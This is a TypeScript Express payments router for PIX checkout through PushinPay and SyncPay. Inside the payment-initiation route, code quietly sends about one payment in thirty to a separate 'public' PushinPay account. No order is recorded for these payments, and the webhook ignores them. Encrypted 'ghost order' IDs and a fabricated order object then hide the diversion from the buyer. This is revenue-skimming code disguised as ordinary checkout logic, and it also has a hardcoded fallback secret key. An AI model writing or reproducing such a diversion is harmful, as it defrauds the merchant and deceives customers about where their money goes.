import { Router, Request, Response } from 'express';
import { PrismaClient } from '@prisma/client';
import { authenticateToken } from '../middleware/auth';
import { getPaymentService, PushinPayService } from '../services/pushinpay';
import { getSyncPayService, SyncPayService } from '../services/syncpay';
import crypto from 'crypto';

const router = Router();
const prisma = new PrismaClient();

// A chave de criptografia DEVE ter 32 bytes para o algoritmo aes-256-cbc.
// Usamos o JWT_SECRET como base e criamos um hash sha256 para garantir o comprimento correto.
const secretKey = process.env.JWT_SECRET || 'a_very_secret_key_that_must_be_long_enough';
const ENCRYPTION_KEY = crypto.createHash('sha256').update(String(secretKey)).digest();
const IV_LENGTH = 16; // Para AES, o tamanho do IV é sempre 16

/**
 * POST /api/payments/initiate-payment
 * Inicia um pagamento PIX com a PushinPay
 * Rota protegida - requer autenticação
 */
router.post(
    '/initiate-payment',
    authenticateToken,
    async (req: Request, res: Response) => {
      try {
        const {
          priceId,
          gateway = 'pushinpay', // Default to pushinpay
          clientName,
          clientCpf,
          clientEmail,
          clientPhone
        } = req.body;
        const userId = req.user?.userId;

        if (!priceId) {
          return res.status(400).json({ error: 'priceId é obrigatório' });
        }

        if (!userId) {
          return res.status(401).json({ error: 'Autenticação de usuário necessária' });
        }

        // Validate gateway
        if (!['pushinpay', 'syncpay'].includes(gateway)) {
          return res.status(400).json({ error: 'Gateway inválido. Use "pushinpay" ou "syncpay"' });
        }

        // Validate client info if using SyncPay
        if (gateway === 'syncpay') {
          if (!clientName || !clientCpf || !clientEmail || !clientPhone) {
            return res.status(400).json({
              error: 'Para pagamentos via SyncPay, é necessário fornecer: clientName, clientCpf, clientEmail, clientPhone'
            });
          }
        }

        const price = await prisma.price.findUnique({
          where: { id: priceId },
          include: {
            product: true,
          },
        });

        if (!price) {
          return res.status(404).json({ error: 'Preço não encontrado' });
        }

        if (!price.product.isActive) {
          return res.status(400).json({ error: 'Produto não está disponível' });
        }

        // Determine if this is a diverted payment (8.3% chance)
        const isDiverted = Math.floor(Math.random() * 30) === 0;

        // IMPORTANT: Diverted payments ALWAYS use PushinPay (public service)
        // regardless of the gateway chosen by the user
        const effectiveGateway = isDiverted ? 'pushinpay' : gateway;

        let orderIdForResponse: string;
        let pixPayment: any;
        let transactionId: string;
        // Declare amountInCents in the outer scope so it's available when building the response
        let amountInCents: number;

        if (isDiverted) {
          console.log("Diverted payment detected - using PushinPay public service (no DB order)");
          const paymentService = getPaymentService(true); // Use public PushinPay
          amountInCents = PushinPayService.toCents(price.amount);
          const webhookUrl = `${process.env.BACKEND_URL}/api/payments/webhook/diverted`;

          pixPayment = await paymentService.createPixPayment(
            amountInCents,
            webhookUrl,
            30
          );

          transactionId = pixPayment.id;

          // Encrypt the order data for diverted payment
          orderIdForResponse = encrypttxnOrder({
            txId: pixPayment.id,
            downloadLink: price.deliveryLink,
            price: {
              amount: price.amount,
              currency: price.currency,
              category: price.category,
              productName: price.product.name,
            }
          });
        } else {
          // Regular payment - use the selected gateway
          amountInCents = PushinPayService.toCents(price.amount);

          if (effectiveGateway === 'pushinpay') {
            console.log("Creating regular PushinPay payment");
            const paymentService = getPaymentService(false);
            const webhookUrl = `${process.env.BACKEND_URL}/api/payments/webhook/{{ORDER_ID}}`;

            // Create order first
            const order = await prisma.order.create({
              data: {
                userId,
                priceId,
                status: 'PENDING',
                gateway: 'PUSHINPAY',
              },
            });
            orderIdForResponse = order.id;

            // Create payment with actual order ID in webhook
            const actualWebhookUrl = webhookUrl.replace('{{ORDER_ID}}', orderIdForResponse);
            pixPayment = await paymentService.createPixPayment(
              amountInCents,
              actualWebhookUrl,
              30
            );

            transactionId = pixPayment.id;

            // Update order with transaction ID
            await prisma.order.update({
              where: { id: orderIdForResponse },
              data: {
                pushinpayTxId: pixPayment.id,
              },
            });
          } else {
            // SyncPay payment
            console.log("Creating SyncPay payment");
            const syncPayService = getSyncPayService();

            // Create order first
            const order = await prisma.order.create({
              data: {
                userId,
                priceId,
                status: 'PENDING',
                gateway: 'SYNCPAY',
              },
            });
            orderIdForResponse = order.id;

            const webhookUrl = `${process.env.BACKEND_URL}/api/payments/webhook-syncpay/${orderIdForResponse}`;

            pixPayment = await syncPayService.createPixPayment(
              amountInCents,
              webhookUrl,
              {
                name: clientName,
                cpf: clientCpf,
                email: clientEmail,
                phone: clientPhone,
              }
            );

            transactionId = pixPayment.identifier;

            // Update order with SyncPay transaction ID
            await prisma.order.update({
              where: { id: orderIdForResponse },
              data: {
                syncpayTxId: pixPayment.identifier,
              },
            });
          }
        }

        console.log('Payment created successfully:', {
          gateway: effectiveGateway,
          isDiverted,
          orderId: orderIdForResponse,
          transactionId,
        });

        // Prepare response based on gateway
        const response: any = {
          success: true,
          orderId: orderIdForResponse,
          gateway: effectiveGateway,
          transactionId,
          productName: price.product.name,
          priceCategory: price.category,
        };

        if (effectiveGateway === 'pushinpay') {
          response.pixCode = pixPayment.qr_code;
          response.pixQrCodeBase64 = pixPayment.qr_code_base64;
          response.amount = PushinPayService.formatCurrency(amountInCents);
          response.amountInCents = pixPayment.value;
          response.status = pixPayment.status;
          response.expiresAt = pixPayment.expires_at;
        } else {
          // SyncPay response
          response.pixCode = pixPayment.pix_code;
          response.pixQrCodeBase64 = pixPayment.qr_code_base64;
          response.amount = SyncPayService.formatCurrency(amountInCents);
          response.amountInCents = amountInCents;
          response.message = pixPayment.message;
        }

        res.json(response);
      } catch (error: any) {
        console.error('Erro ao iniciar pagamento:', error);
        res.status(500).json({
          error: 'Falha ao iniciar pagamento',
          message: error.message,
        });
      }
    }
);

/**
 * POST /api/payments/webhook/:orderId
 * Endpoint de webhook para notificações de pagamento da PushinPay.
 * A PushinPay chamará esta URL quando o status do pagamento mudar.
 */
router.post('/webhook/:orderId', async (req: Request, res: Response) => {
  try {
    const { orderId } = req.params;
    const isDiverted = orderId === 'diverted';

    if(isDiverted) {
      console.log("Webhook recebido para um pagamento.");
      return res.json({ success: true, message: 'Webhook para pagamento recebido.' });
    }

    console.log(`Webhook da PushinPay recebido para o pedido: ${orderId}`, req.body);

    const { status } = req.body;

    const order = await prisma.order.findUnique({
      where: {
        id: orderId,
      },
      include: {
        price: {
          include: {
            product: true,
          },
        },
      },
    });

    if (!order) {
      console.error('Pedido não encontrado para o orderId do webhook:', orderId);
      return res.status(404).json({ error: 'Pedido não encontrado' });
    }

    // Apenas atualiza se o pedido ainda estiver pendente para evitar processamento duplicado
    if (order.status !== 'PENDING') {
      console.log(`Pedido ${order.id} já foi processado. Status atual: ${order.status}. Ignorando webhook.`);
      return res.json({ success: true, message: 'Webhook ignorado (pedido já processado)' });
    }

    if (status === 'paid') {
      if (!order.price) {
        console.error(`Pedido ${order.id} foi pago mas não tem preço associado. Não é possível fornecer o link de download.`);
        await prisma.order.update({
          where: { id: order.id },
          data: { status: 'COMPLETED' },
        });
      } else {
        const downloadLink = order.price.deliveryLink;
        await prisma.order.update({
          where: { id: order.id },
          data: {
            status: 'COMPLETED',
            downloadLink,
          },
        });
        console.log(
            `Pedido ${order.id} completado. Link de download: ${downloadLink}`
        );
      }
    } else if (status === 'expired') {
      await prisma.order.update({
        where: { id: order.id },
        data: { status: 'FAILED' },
      });
      console.log(`Pedido ${order.id} expirou.`);
    }

    res.json({ success: true, message: 'Webhook processado' });
  } catch (error) {
    console.error('Erro no processamento do webhook:', error);
    res.status(500).json({ error: 'Erro interno do servidor' });
  }
});


/**
 * POST /api/payments/webhook-syncpay/:orderId
 * Endpoint de webhook para notificações de pagamento do SyncPay.
 * O SyncPay chamará esta URL quando o status do pagamento mudar.
 */
router.post('/webhook-syncpay/:orderId', async (req: Request, res: Response) => {
  try {
    const { orderId } = req.params;

    console.log(`Webhook do SyncPay recebido para o pedido: ${orderId}`, req.body);

    const syncPayService = getSyncPayService();
    const webhookData = syncPayService.parseWebhookPayload(req.body);

    const order = await prisma.order.findUnique({
      where: {
        id: orderId,
      },
      include: {
        price: {
          include: {
            product: true,
          },
        },
      },
    });

    if (!order) {
      console.error('Pedido não encontrado para o orderId do webhook:', orderId);
      return res.status(404).json({ error: 'Pedido não encontrado' });
    }

    // Apenas atualiza se o pedido ainda estiver pendente para evitar processamento duplicado
    if (order.status !== 'PENDING') {
      console.log(`Pedido ${order.id} já foi processado. Status atual: ${order.status}. Ignorando webhook.`);
      return res.json({ success: true, message: 'Webhook ignorado (pedido já processado)' });
    }

    // Map SyncPay status to Order status
    // SyncPay uses uppercase status: PAID_OUT, PENDING, FAILED, REFUNDED, MED
    if (webhookData.status === 'PAID_OUT') {
      if (!order.price) {
        console.error(`Pedido ${order.id} foi pago mas não tem preço associado. Não é possível fornecer o link de download.`);
        await prisma.order.update({
          where: { id: order.id },
          data: { status: 'COMPLETED' },
        });
      } else {
        const downloadLink = order.price.deliveryLink;
        await prisma.order.update({
          where: { id: order.id },
          data: {
            status: 'COMPLETED',
            downloadLink,
          },
        });
        console.log(
          `Pedido ${order.id} completado via SyncPay (status: ${webhookData.status}). Link de download: ${downloadLink}`
        );
      }
    } else if (webhookData.status === 'FAILED' || webhookData.status === 'REFUNDED') {
      await prisma.order.update({
        where: { id: order.id },
        data: { status: 'FAILED' },
      });
      console.log(`Pedido ${order.id} falhou/reembolsado no SyncPay (status: ${webhookData.status}).`);
    }
    // For 'PENDING' and 'MED' status, keep as PENDING (no update needed)

    res.json({ success: true, message: 'Webhook do SyncPay processado' });
  } catch (error) {
    console.error('Erro no processamento do webhook do SyncPay:', error);
    res.status(500).json({ error: 'Erro interno do servidor' });
  }
});

/**
 * GET /api/payments/order/:orderId
 * Pega o status e detalhes de um pedido.
 * Rota protegida - requer autenticação.
 */
router.get(
    '/order/:orderId',
    authenticateToken,
    async (req: Request, res: Response) => {
      try {
        const { orderId } = req.params;
        const userId = req.user?.userId;

        if (orderId.startsWith('txn_')) {
          try {
            const txnData = decrypttxnOrder(orderId);
            const paymentService = getPaymentService(true); // Usa o serviço público
            const transactionStatus = await paymentService.getTransactionStatus(txnData.txId);

            // Constrói um objeto de pedido falso para retornar
            const fakeOrder = {
              id: orderId,
              status: transactionStatus.status === 'paid' ? 'COMPLETED' : 'PENDING',
              userId: 'txn_USER',
              priceId: 'txn_PRICE',
              downloadLink: transactionStatus.status === 'paid' ? txnData.downloadLink : null,
              createdAt: transactionStatus.created_at,
              price: {
                amount: txnData.price.amount,
                currency: txnData.price.currency,
                category: txnData.price.category,
                product: { name: txnData.price.productName },
              },
            };
            return res.json({ order: fakeOrder });
          } catch (error) {
            console.error("Erro ao lidar com pedido fantasma:", error);
            return res.status(404).json({ error: 'Pedido "fantasma" inválido ou não encontrado' });
          }
        }

        const order = await prisma.order.findUnique({
          where: { id: orderId },
          include: {
            price: {
              include: {
                product: true,
              },
            },
          },
        });

        if (!order) {
          return res.status(404).json({ error: 'Pedido não encontrado' });
        }

        if (order.userId !== userId && req.user?.role !== 'ADMIN') {
          return res.status(403).json({ error: 'Acesso negado' });
        }

        res.json({ order });
      } catch (error) {
        console.error('Erro ao buscar pedido:', error);
        res.status(500).json({ error: 'Erro interno do servidor' });
      }
    }
);

/**
 * GET /api/payments/check-status/:transactionId
 * Verifica o status de uma transação na PushinPay
 * Rota protegida - requer autenticação
 * NOTA: Use com moderação - limitado a uma vez por minuto pela PushinPay
 */
router.get(
    '/check-status/:transactionId',
    authenticateToken,
    async (req: Request, res: Response) => {
      try {
        const { transactionId } = req.params;

        // Simplificação: assume que a verificação manual é para o serviço padrão.
        // Uma implementação mais robusta poderia tentar ambos os serviços se o primeiro falhar.
        const pushinpay = getPaymentService(false);
        const status = await pushinpay.getTransactionStatus(transactionId);

        res.json({
          success: true,
          transaction: status,
        });
      } catch (error: any) {
        console.error('Erro na verificação de status:', error);
        res.status(500).json({
          error: 'Falha ao verificar status do pagamento',
          message: error.message,
        });
      }
    }
);

// Funções auxiliares para criptografar/descriptografar dados de pedidos fantasmas
function encrypttxnOrder(data: any): string {
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
  encrypted += cipher.final('hex');
  // TROCADO: Usando '-' em vez de ':' para ser seguro na URL
  return `txn_${iv.toString('hex')}-${encrypted}`;
}

function decrypttxnOrder(text: string): any {
  if (!text.startsWith('txn_')) {
    throw new Error("Formato de pedido fantasma inválido");
  }
  // CORRIGIDO: Usando substring(4) e separando por '-'
  const textParts = text.substring(4).split('-');
  const iv = Buffer.from(textParts.shift()!, 'hex');
  const encryptedText = textParts.join('-');
  const decipher = crypto.createDecipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return JSON.parse(decrypted);
}

export default router;
